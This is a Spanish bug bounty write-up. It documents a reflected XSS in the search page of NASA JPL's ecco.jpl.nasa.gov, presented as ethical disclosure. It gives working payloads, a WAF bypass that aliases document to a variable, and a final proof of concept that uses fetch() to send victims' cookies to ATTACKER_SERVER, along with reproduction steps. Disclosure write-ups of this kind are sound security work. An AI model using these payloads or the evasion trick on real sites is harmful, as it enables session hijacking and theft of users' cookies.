---
layout: null
---
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NASA JPL: XSS Reflejado | ConnorDev</title>
    <link rel="stylesheet" href="../../../assets/css/styles.css">
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🛡️</text></svg>">
</head>
<body>
<div class="container submission-body">
<article class="bounty-report">

# NASA JPL: Reflected XSS en Formulario de Búsqueda y Exfiltración de Cookies

[English (EN)](../../../en/bounties/nasa-jpl-ecco-xss-waf-bypass/)

## Introducción

Este informe documenta una vulnerabilidad de **Cross-Site Scripting Reflejado (XSS)** descubierta en el activo de la NASA Jet Propulsion Laboratory (JPL) `ecco.jpl.nasa.gov`. La vulnerabilidad reside en la funcionalidad de búsqueda y requirió el bypass de un Web Application Firewall (WAF) para lograr la exfiltración de cookies.

---

## 🔍 Búsqueda Inicial

Al igual que en cualquier programa de bug bounty, el primer paso fue usar la página como un usuario normal. El campo de búsqueda destacó, así que decidí probarlo:

`https://ecco.jpl.nasa.gov/search.htm?search=pwn`

Me di cuenta de que el valor que introducía se reflejaba directamente en el sitio web.

![Búsqueda Normal](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png)

Al inspeccionar el código fuente del sitio web, vi que la entrada estaba colocada dentro de una función JavaScript `console.log()`:

![Resultado Búsqueda Normal](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png)

```javascript
console.log('pwn');
```

---

## 🛡️ Tag `<script>` Denegado

Realicé pruebas básicas de XSS usando la etiqueta `<script>`:

`https://ecco.jpl.nasa.gov/search.htm?search=<script>alert(1)</script>`

El Web Application Firewall (WAF) rechazó la solicitud a la mínima señal de actividad maliciosa (el tag `<script>`).

![WAF bloqueando tag script](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)

---

## 🏗️ Cerrando el String de JavaScript `console.log`

Decidí intentar cerrar la función `console.log()` para insertar código justo después. Usé el siguiente payload: `pwn');`

`https://ecco.jpl.nasa.gov/search.htm?search=pwn');`

El `')` cierra el string y la función. Sin embargo, noté que el punto y coma `;` no se mostraba en la salida, a pesar de haberlo introducido.

![Cerrando console.log](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png)

---

## ❓ Concatenación de Javascript (No Funciona)

Intenté añadir más código después del punto y coma:

`https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)`

El punto y coma seguía sin aparecer, y todo lo que iba detrás de él desaparecía del texto reflejado.

![Dónde está el punto y coma](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png)

---

## ✅ Concatenación de Javascript (Funcionando)

Para que funcionara, tuve que codificar el punto y coma en formato URL como `%3b`.

`https://ecco.jpl.nasa.gov/search.htm?search=pwn')%3balert(1)`

A partir de ese momento, pude introducir código JavaScript para llevar a cabo el ataque.

![Bypass de punto y coma](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png)

---

## 🚨 Primer Alert (Funcionando)

Aunque el WAF filtraba el tag de apertura `<script>`, permitió el tag de cierre `</script>`.

Payload: `pwn')%3balert(1)</script>;//`

`https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//`

Esto resultó en un **XSS Reflejado** exitoso.

![Alert 1 HTML](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png)

![Alert 1](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png)

---

## 🛑 Segundo Alert (Filtro del Firewall)

Después de ejecutar un `alert()`, quise exfiltrar las cookies.

`https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//`

El WAF rechazó la solicitud en cuanto detectó cadenas sospechosas como `document.cookie`.

![WAF bloqueando document.cookie](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)

---

## 🔓 Tercer Alert (Bypass del Firewall)

Para saltarme el WAF, creé una variable `a` que contenía `document` y luego solicité `cookie` desde esa variable.

Payload: `pwn')%3ba=document%3balert(a.cookie)</script>;//`

`https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//`

![Alerta de Cookies con Bypass](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png)

![Resultado de Cookies con Bypass](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png)

```javascript
pwn'); // Rompemos la lógica del sistema
a=document; // Creamos la variable 'a' que contiene document
alert(a.cookie); // Llamamos al alert con las cookies
</script>;// // Cerramos el tag y comentamos el resto del código
```

---

## 🚀 Exploit Final (Exfiltración de Cookies)

La Prueba de Concepto (PoC) final consistió en usar `fetch()` para enviar las cookies a un servidor controlado por el atacante.

Payload: `pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>//`

![Exfiltración de Cookies con Fetch](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png)

![Petición de Exfiltración Recibida](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png)

---

## 🎖️ Reconocimiento y Premio

Tras la divulgación ética, recibí una **Carta de Reconocimiento** del **NASA Jet Propulsion Laboratory (JPL)** reconociendo el impacto de la investigación y su contribución a la seguridad de sus activos.

<div class="pdf-container">
  <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" width="100%" height="100%" frameborder="0"></iframe>
</div>

<p style="text-align: center;">
  <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">📥 Descargar Carta Oficial (PDF)</a>
</p>

---

## 🎯 Pasos para Reproducir

1. Iniciar un servidor web público (ej. usando Serveo exponiendo un servidor python local).
2. Construir la URL con la dirección de tu servidor:
   `https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E`
3. Visitar la URL y recibirás una petición con las cookies de la víctima adjuntas.

---

## 🤝 Detalle de Colaboración
Esta investigación fue realizada en una **colaboración al 50%** entre **{{ site.researchers.ivan.name }}** y **{{ site.researchers.diego.name }}**. Ambos investigadores contribuyeron equitativamente al descubrimiento, explotación y documentación de esta vulnerabilidad.

## 🏁 Investigadores y Contacto

**{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
**{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))

</article>
</div>
</body>
</html>
